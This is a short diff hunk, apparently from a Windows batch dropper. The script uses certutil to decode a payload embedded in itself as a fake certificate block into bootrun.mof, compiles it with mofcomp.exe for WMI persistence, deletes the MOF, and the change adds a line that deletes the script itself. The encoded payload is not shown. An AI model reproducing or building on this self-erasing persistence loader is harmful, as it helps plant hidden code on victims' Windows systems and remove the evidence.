@@ -3,6 +3,7 @@ certutil -decode "%~f0" bootrun.mof
 cd %temp%
 mofcomp.exe %temp%\bootrun.mof
 del %temp%\bootrun.mof
+del "%~f0"
 exit /b 1
 
 -----BEGIN CERTIFICATE-----
